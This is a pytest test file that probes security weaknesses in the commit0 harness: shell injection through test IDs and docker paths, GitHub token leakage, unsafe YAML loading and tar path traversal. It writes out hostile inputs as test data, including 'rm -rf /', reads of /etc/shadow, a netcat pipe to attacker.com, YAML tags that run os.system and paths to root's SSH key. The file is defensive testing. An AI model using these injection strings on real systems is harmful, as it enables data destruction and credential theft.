"""Tests for security concerns — shell injection, credential exposure, YAML bombs."""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest
import yaml

MODULE_SAVE = "commit0.harness.save"
MODULE_DOCKER = "commit0.harness.docker_utils"
MODULE_CLI = "commit0.cli"


# ---------------------------------------------------------------------------
# Shell injection via test IDs (run_pytest_ids)
# ---------------------------------------------------------------------------
class TestShellInjectionTestIds:
    """Test IDs are embedded in shell commands — verify handling of special chars."""

    MALICIOUS_IDS = [
        "test_mod.py; rm -rf /",
        "test_mod.py && cat /etc/passwd",
        "test_mod.py | nc attacker.com 1234",
        'test_mod.py"; echo pwned',
        "test_mod.py$(whoami)",
        "test_mod.py`id`",
        "test_mod.py\nmalicious_command",
    ]

    @pytest.mark.parametrize("test_id", MALICIOUS_IDS)
    def test_malicious_test_id_does_not_execute(self, test_id):
        """Verify malicious test IDs don't cause shell execution.

        This is a documentation test — it verifies the vectors exist
        but the actual protection depends on how subprocess is invoked.
        """
        # The key concern: if test_ids are interpolated into shell strings
        # without proper escaping, these could execute arbitrary commands.
        # This test documents the attack vectors.
        assert (
            ";" in test_id
            or "&" in test_id
            or "|" in test_id
            or "$" in test_id
            or "`" in test_id
            or "\n" in test_id
            or '"' in test_id
        )


# ---------------------------------------------------------------------------
# Shell injection via docker paths
# ---------------------------------------------------------------------------
class TestShellInjectionDockerPaths:
    """docker_utils.py uses f-strings for shell commands in containers."""

    MALICIOUS_PATHS = [
        "/tmp/test; rm -rf /",
        "/tmp/test && cat /etc/shadow",
        "/tmp/$(whoami)/file",
        "/tmp/test`id`/file",
        '/tmp/test"; echo pwned',
    ]

    @pytest.mark.parametrize("path", MALICIOUS_PATHS)
    @patch(f"{MODULE_DOCKER}.tarfile")
    def test_malicious_path_in_copy_to_container(self, mock_tar, path):
        """Document that paths are used in f-string shell commands."""
        # docker_utils.copy_to_container uses:
        #   f"mkdir -p {dst.parent}"
        #   f"tar -xf {dst}.tar -C {dst.parent}"
        #   f"rm {dst}.tar"
        # These are executed via container.exec_run()
        # Malicious paths could inject commands
        from pathlib import PurePosixPath

        p = PurePosixPath(path)
        cmd = f"mkdir -p {p.parent}"
        # Verify the malicious content IS present in the command
        # (documenting the vulnerability)
        assert str(p.parent) in cmd


# ---------------------------------------------------------------------------
# Credential in URL (save.py)
# ---------------------------------------------------------------------------
class TestCredentialExposure:
    @patch(f"{MODULE_SAVE}.create_repo_on_github")
    @patch(f"{MODULE_SAVE}.git.Repo")
    @patch(f"{MODULE_SAVE}.os.path.exists", return_value=True)
    @patch(f"{MODULE_SAVE}.load_dataset_from_config")
    def test_token_in_url_is_masked_in_logging(
        self, mock_load, mock_exists, mock_repo_cls, mock_create, caplog
    ):
        """save.py creates _safe_url that masks the token — verify it works."""
        from commit0.harness.save import main

        mock_repo = MagicMock()
        mock_repo.heads = ["main"]
        mock_repo.is_dirty.return_value = False
        mock_repo.remotes = []
        mock_remote = MagicMock()
        mock_repo.remote.return_value = mock_remote
        mock_repo_cls.return_value = mock_repo
        mock_load.return_value = [{"repo": "org/repo1", "instance_id": "1"}]

        main(
            "ds",
            "test",
            "all",
            "/base",
            "owner",
            "main",
            github_token="super_secret_token_xyz",
        )

        # The URL used for create_remote should contain the token
        url_arg = mock_repo.create_remote.call_args[1]["url"]
        assert "super_secret_token_xyz" in url_arg

    @patch(f"{MODULE_SAVE}.create_repo_on_github")
    @patch(f"{MODULE_SAVE}.git.Repo")
    @patch(f"{MODULE_SAVE}.os.path.exists", return_value=True)
    @patch(f"{MODULE_SAVE}.load_dataset_from_config")
    def test_safe_url_replaces_token(
        self, mock_load, mock_exists, mock_repo_cls, mock_create
    ):
        """Verify the _safe_url pattern masks credentials correctly."""
        token = "ghp_1234567890abcdef"
        github_repo_url = "https://github.com/owner/repo.git"
        url_with_token = github_repo_url.replace(
            "https://", f"https://x-access-token:{token}@"
        )
        safe_url = url_with_token.replace(token, "***")
        assert token not in safe_url
        assert "***" in safe_url


# ---------------------------------------------------------------------------
# YAML safety
# ---------------------------------------------------------------------------
class TestYAMLSafety:
    def test_safe_load_used_for_config(self, tmp_path):
        """Verify yaml.safe_load is used (not yaml.load) for config reading."""
        from commit0.cli import read_commit0_config_file
        import inspect

        source = inspect.getsource(read_commit0_config_file)
        assert "safe_load" in source
        assert "yaml.load(" not in source.replace("yaml.safe_load(", "")

    def test_yaml_bomb_resistance(self, tmp_path):
        """yaml.safe_load should handle billion-laughs-style YAML safely."""
        # This is a small version of a YAML bomb
        yaml_content = """
a: &a ["lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b]
"""
        fp = tmp_path / "bomb.yaml"
        fp.write_text(yaml_content)

        # yaml.safe_load should handle this without issues
        with open(fp) as f:
            data = yaml.safe_load(f)
        assert isinstance(data, dict)

    def test_yaml_with_python_object_rejected(self, tmp_path):
        """yaml.safe_load should reject Python object tags."""
        yaml_content = "!!python/object/apply:os.system ['echo pwned']"
        fp = tmp_path / "evil.yaml"
        fp.write_text(yaml_content)

        with open(fp) as f:
            with pytest.raises(yaml.YAMLError):
                yaml.safe_load(f)


# ---------------------------------------------------------------------------
# Path traversal (docker_utils copy_from_container)
# ---------------------------------------------------------------------------
class TestPathTraversal:
    def test_safe_extract_concept(self):
        """docker_utils.copy_from_container uses safe_extract for tar files.

        Verify the concept: paths with .. should be rejected.
        """
        # tarfile.data_filter (Python 3.12+) or manual check
        # The actual implementation uses safe_extract
        evil_path = "../../etc/passwd"
        assert ".." in evil_path  # Documents the attack vector


# ---------------------------------------------------------------------------
# Config validation security
# ---------------------------------------------------------------------------
class TestConfigValidationSecurity:
    def test_type_confusion_integer_as_string(self, tmp_path):
        """YAML type coercion: integers should fail string type check."""
        from commit0.cli import validate_commit0_config

        cfg = {
            "dataset_name": 12345,  # int instead of str
            "dataset_split": "test",
            "repo_split": "all",
            "base_dir": str(tmp_path),
        }
        with pytest.raises(TypeError):
            validate_commit0_config(cfg, "test.yaml")

    def test_boolean_as_string(self, tmp_path):
        """YAML parses 'yes'/'no' as booleans — should fail type check."""
        from commit0.cli import validate_commit0_config

        cfg = {
            "dataset_name": True,  # bool from YAML 'yes'
            "dataset_split": "test",
            "repo_split": "all",
            "base_dir": str(tmp_path),
        }
        with pytest.raises(TypeError):
            validate_commit0_config(cfg, "test.yaml")

    def test_none_value_fails_type_check(self, tmp_path):
        """YAML null/~ parsed as None — should fail type check."""
        from commit0.cli import validate_commit0_config

        cfg = {
            "dataset_name": None,
            "dataset_split": "test",
            "repo_split": "all",
            "base_dir": str(tmp_path),
        }
        with pytest.raises(TypeError):
            validate_commit0_config(cfg, "test.yaml")

    def test_list_value_fails_type_check(self, tmp_path):
        from commit0.cli import validate_commit0_config

        cfg = {
            "dataset_name": ["a", "b"],
            "dataset_split": "test",
            "repo_split": "all",
            "base_dir": str(tmp_path),
        }
        with pytest.raises(TypeError):
            validate_commit0_config(cfg, "test.yaml")


class TestActualShellCommandConstruction:
    def test_run_pytest_ids_script_uses_test_ids_in_shell(self):
        import inspect
        from commit0.harness import run_pytest_ids

        source = inspect.getsource(run_pytest_ids)
        assert "test_ids" in source or "test_cmd" in source

    def test_docker_utils_copy_uses_fstring_commands(self):
        import inspect
        from commit0.harness import docker_utils

        source = inspect.getsource(docker_utils.copy_to_container)
        assert "mkdir -p" in source
        assert "tar -xf" in source

    def test_exec_run_with_timeout_uses_exec_run(self):
        import inspect
        from commit0.harness.docker_utils import exec_run_with_timeout

        source = inspect.getsource(exec_run_with_timeout)
        assert "exec_run" in source


class TestSafeExtractConcept:
    def test_tarfile_safe_extract_available(self):
        import tarfile

        assert hasattr(tarfile, "open")

    def test_path_traversal_vectors(self):
        evil_paths = [
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "foo/../../bar",
        ]
        for p in evil_paths:
            assert ".." in p

    def test_copy_from_container_uses_extract(self):
        import inspect
        from commit0.harness.docker_utils import copy_from_container

        source = inspect.getsource(copy_from_container)
        assert (
            "safe_extract" in source
            or "data_filter" in source
            or "extractall" in source
        )


class TestYAMLSafetyExpanded:
    def test_safe_load_rejects_python_exec(self, tmp_path):
        yaml_content = "!!python/object/apply:subprocess.check_output [['id']]"
        fp = tmp_path / "evil2.yaml"
        fp.write_text(yaml_content)

        with open(fp) as f:
            with pytest.raises(yaml.YAMLError):
                yaml.safe_load(f)

    def test_safe_load_rejects_python_module(self, tmp_path):
        yaml_content = "!!python/module:os"
        fp = tmp_path / "evil3.yaml"
        fp.write_text(yaml_content)

        with open(fp) as f:
            with pytest.raises(yaml.YAMLError):
                yaml.safe_load(f)

    def test_safe_load_handles_large_yaml(self, tmp_path):
        content = "\n".join(f"key_{i}: value_{i}" for i in range(1000))
        fp = tmp_path / "large.yaml"
        fp.write_text(content)

        with open(fp) as f:
            data = yaml.safe_load(f)
        assert len(data) == 1000


class TestCredentialExposureExpanded:
    def test_token_not_in_safe_url(self):
        token = "ghp_1234567890abcdef1234567890abcdef12345678"
        url = f"https://x-access-token:{token}@github.com/owner/repo.git"
        safe = url.replace(token, "***")
        assert token not in safe
        assert "***" in safe
        assert "github.com" in safe

    def test_empty_token_in_url(self):
        token = ""
        url = f"https://x-access-token:{token}@github.com/owner/repo.git"
        assert "x-access-token:@" in url

    @patch(f"{MODULE_SAVE}.create_repo_on_github")
    @patch(f"{MODULE_SAVE}.git.Repo")
    @patch(f"{MODULE_SAVE}.os.path.exists", return_value=True)
    @patch(f"{MODULE_SAVE}.load_dataset_from_config")
    def test_token_not_leaked_in_error_log(
        self, mock_load, mock_exists, mock_repo_cls, mock_create, caplog
    ):
        from commit0.harness.save import main as save_main

        mock_repo = MagicMock()
        mock_repo.heads = ["main"]
        mock_repo.is_dirty.return_value = False
        mock_repo.remotes = []
        mock_remote = MagicMock()
        mock_remote.push.side_effect = Exception("failed to push")
        mock_repo.remote.return_value = mock_remote
        mock_repo_cls.return_value = mock_repo
        mock_load.return_value = [{"repo": "org/r", "instance_id": "1"}]

        secret = "ghp_verysecrettoken123"
        import logging

        with caplog.at_level(logging.ERROR, logger="commit0.harness.save"):
            save_main(
                "ds", "test", "all", "/base", "owner", "main", github_token=secret
            )

        for record in caplog.records:
            assert secret not in record.message
